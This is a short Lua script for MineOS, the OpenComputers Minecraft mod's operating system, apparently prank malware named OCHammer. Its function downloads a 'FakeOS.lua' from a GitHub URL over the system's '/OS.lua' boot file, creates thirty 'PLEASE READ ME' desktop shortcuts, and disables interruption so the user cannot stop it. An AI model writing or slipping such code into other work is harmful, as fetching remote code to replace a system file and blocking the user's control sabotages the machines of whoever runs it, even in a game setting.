
-- Import libraries
local GUI = require("GUI")
local system = require("System")
local paths = require("Paths")
local com = require("Component")
local event = require("event")
local fs = require("Filesystem")
local internet = require("Internet")

local wait = event.sleep

--- The fun begins ---

function FUN()
  
  local cdir = fs.path(system.getCurrentScript())


  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer.app/FakeOS.lua","/OS.lua")
    
  -- spam a bunch of icons on the desktop
  for i = 1,30 do
    system.createShortcut(paths.user.desktop .. "PLEASE READ ME " .. tostring(i),"/MineOS/Greetz.app/")
  end

  wait(1)
  
end

event.interruptingEnabled = false
